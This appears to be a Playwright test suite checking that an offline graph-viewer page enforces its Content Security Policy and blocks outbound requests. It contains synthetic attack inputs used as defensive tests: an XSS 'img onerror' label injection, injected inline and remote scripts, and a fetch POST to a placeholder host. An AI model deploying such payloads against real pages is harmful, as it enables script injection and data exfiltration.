"""Browser security probes with synthetic payloads and outbound interception."""
import importlib.util
import json
import hashlib
import os
from pathlib import Path
import shutil
import tempfile
import unittest

ROOT=Path(__file__).resolve().parents[1]
SPEC=importlib.util.spec_from_file_location('secure_browser_viewer',ROOT/'scripts/graph_explorer.py')
VIEWER=importlib.util.module_from_spec(SPEC);SPEC.loader.exec_module(VIEWER)
BROWSER=os.environ.get('LOCAL_GRAPH_BROWSER') or shutil.which('chromium') or shutil.which('google-chrome')

@unittest.skipUnless(BROWSER and importlib.util.find_spec('playwright'),'optional Playwright/Chromium unavailable')
class SecurityBrowserTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from playwright.sync_api import sync_playwright
        cls.pw=sync_playwright().start()
        cls.browser=cls.pw.chromium.launch(headless=True,executable_path=BROWSER,args=['--no-sandbox'])

    @classmethod
    def tearDownClass(cls):
        cls.browser.close();cls.pw.stop()

    def setUp(self):
        self.temp=tempfile.TemporaryDirectory();self.root=Path(self.temp.name)
        self.context=self.browser.new_context(accept_downloads=True,viewport={'width':1440,'height':1000})
        self.page=self.context.new_page();self.outbound=[];self.errors=[]
        def block(route):
            self.outbound.append(route.request.url);route.abort()
        self.page.route('http://**/*',block);self.page.route('https://**/*',block)
        self.page.on('pageerror',lambda error:self.errors.append(str(error)))
        self.source=ROOT/'examples/fieldwork-view.json'

    def tearDown(self):
        try:
            self.assertEqual(self.outbound,[],'A prohibited request reached the interception boundary')
            self.assertEqual(self.errors,[])
        finally:
            self.context.close();self.temp.cleanup()

    def render(self, **kwargs):
        output=self.root/'view.html'
        receipt=VIEWER.render(self.source,output,ROOT/'assets/graph-viewer.html','auto','auto',kwargs.pop('g6_js',None),**kwargs)
        return output.read_text(encoding='utf-8'),receipt

    def load(self, **kwargs):
        page,receipt=self.render(**kwargs)
        self.page.set_content(page,wait_until='networkidle')
        self.page.evaluate("window.securityEvents=[];addEventListener('securitypolicyviolation',e=>securityEvents.push(e.effectiveDirective))")
        return receipt

    def test_csp_blocks_unlisted_inline_script(self):
        self.load()
        self.page.evaluate("() => { const script=document.createElement('script');script.textContent='window.unlistedCodeExecuted=1';document.head.append(script); }")
        self.page.wait_for_timeout(100)
        self.assertIsNone(self.page.evaluate('window.unlistedCodeExecuted'))
        self.assertIn('script-src-elem',self.page.evaluate('window.securityEvents'))

    def test_csp_blocks_fetch_and_remote_resources(self):
        self.load()
        blocked=self.page.evaluate("async () => { try { await fetch('https://example.invalid/blocked',{method:'POST',body:'synthetic-only'});return false; } catch { return true; } }")
        self.assertTrue(blocked)
        self.page.evaluate("() => {const image=new Image();image.src='https://example.invalid/pixel';const script=document.createElement('script');script.src='https://example.invalid/code.js';document.head.append(script);}")
        self.page.wait_for_timeout(100)
        observed=self.page.evaluate('window.securityEvents')
        self.assertIn('connect-src',observed);self.assertIn('img-src',observed);self.assertIn('script-src-elem',observed)

    def test_native_exports_still_work_with_csp(self):
        self.load()
        for fmt,name in [('json','graph-view.json'),('csv','entities.csv'),('svg','graph.svg'),('png','graph.png'),('state','view-state.json')]:
            with self.subTest(fmt=fmt):
                self.page.select_option('#export-format',fmt)
                with self.page.expect_download(timeout=10000) as event:self.page.locator('#export-button').click()
                target=self.root/name;event.value.save_as(target)
                self.assertGreater(target.stat().st_size,10)
        self.assertEqual(self.page.evaluate('window.securityEvents'),[])

    def test_offline_ignores_injected_session_capability(self):
        page,_=self.render()
        page=page.replace('type="application/json">{}</script>','type="application/json">'+json.dumps({'token':'x'*43})+'</script>')
        self.page.set_content(page,wait_until='networkidle')
        self.assertTrue(self.page.locator('#live-panel').is_hidden())
        self.assertEqual(self.page.locator('#local-graph-session').text_content(),'{}')
        self.assertNotIn('x'*43,json.dumps(self.page.evaluate('LocalGraphView.getState()')))

    def test_hostile_parser_content_remains_data(self):
        data=json.loads(self.source.read_text())
        data['nodes'][0]['label']='<!--<script></script><img src=https://example.invalid/pixel onerror=window.DATAEXEC=1>'
        self.source=self.root/'hostile.json';self.source.write_text(json.dumps(data))
        self.load()
        self.assertIsNone(self.page.evaluate('window.DATAEXEC'))
        self.assertEqual(self.page.locator('.node').count(),19)

    def test_extended_code_is_explicit_and_not_certified_offline(self):
        extra=self.root/'extra.js'
        extra.write_text("window.extensionExecuted=true;fetch('https://example.invalid/extension',{method:'POST',body:'synthetic-only'}).catch(()=>window.extensionBlocked=true);",encoding='utf-8')
        receipt=self.load(g6_js=extra,security_profile='extended',g6_sha256=hashlib.sha256(extra.read_bytes()).hexdigest())
        self.assertFalse(receipt['offline'])
        self.assertEqual(receipt['network_policy'],'unverified')
        self.assertTrue(self.page.evaluate('window.extensionExecuted'))
        self.assertTrue(self.page.evaluate('window.extensionBlocked'))
        self.assertTrue(self.page.locator('#live-panel').is_hidden())
        self.assertIn('unverified',self.page.locator('#offline-badge').inner_text())

if __name__=='__main__':unittest.main()
